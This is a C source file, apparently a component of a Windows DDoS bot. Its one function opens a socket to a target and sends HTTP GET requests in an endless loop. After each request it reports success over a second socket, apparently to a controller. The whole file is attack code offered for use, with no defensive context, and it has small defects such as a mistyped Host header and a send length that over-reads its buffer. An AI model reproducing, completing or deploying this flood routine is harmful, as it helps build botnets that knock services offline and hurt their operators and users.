#include "ddosbot.h"

int getflooding_attack() {
	if (connect(sock, (SOCKADDR*)&target_addr, sizeof(target_addr)) == SOCKET_ERROR) {
		perror("Not Connect with target");
		closesocket(sock);
		WSACleanup();
		return -1;
	}

	while (1) {
		url = "GET / HTTP/1.1\r\nHost: localhostr\r\n\r\n";
		if (send(sock, url, strlen(url), 0) == SOCKET_ERROR) {
			perror("send fail");
			closesocket(sock);
			WSACleanup();
			return -1;
		}

		if (send(csock, "get flooding attack success\n", BUFF_SIZE, 0) == SOCKET_ERROR) {
			perror("attacked success but send fail");
			closesocket(sock);
			WSACleanup();
			return -1;
		}
		Sleep(1000);
	}
}
